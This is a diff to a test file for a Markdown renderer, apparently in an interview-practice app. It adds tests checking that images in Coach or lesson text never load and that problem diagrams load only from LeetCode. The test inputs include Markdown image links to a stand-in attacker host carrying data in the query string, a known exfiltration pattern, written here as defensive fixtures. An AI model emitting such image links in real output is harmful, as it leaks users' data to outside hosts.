@@ -4,6 +4,8 @@ import { describe, expect, it } from "vitest";
 import { Markdown, superscriptsAsCarets } from "./markdown";
 
 const render = (md: string) => renderToStaticMarkup(createElement(Markdown, null, md));
+// A problem statement, the one place images may show.
+const statement = (md: string) => renderToStaticMarkup(Markdown({ children: md, statementImages: true }));
 
 describe("Markdown", () => {
   it("never renders raw HTML as elements", () => {
@@ -27,6 +29,22 @@ describe("Markdown", () => {
   it("strips the src from a non-https image, so a tracking pixel never loads", () => {
     const html = render("![tracker](http://tracker.example/p.png)");
     expect(html).not.toContain("http://tracker.example");
+  });
+
+  it("never loads an image from Coach or lesson text, even over https; the alt text stays", () => {
+    const html = render("![readiness](https://evil.example/p.png?d=readiness-61) and ![x][1]\n\n[1]: https://evil.example/q.png");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.example");
+    expect(html).toContain("readiness");
+  });
+
+  it("loads a problem statement's diagram from LeetCode only", () => {
+    expect(statement("![tree](https://assets.leetcode.com/uploads/tree.jpg)")).toContain(
+      '<img alt="tree" src="https://assets.leetcode.com/uploads/tree.jpg"',
+    );
+    const elsewhere = statement("![tree](https://evil.example/tree.jpg?d=1)");
+    expect(elsewhere).not.toContain("<img");
+    expect(elsewhere).not.toContain("evil.example");
   });
 });
 
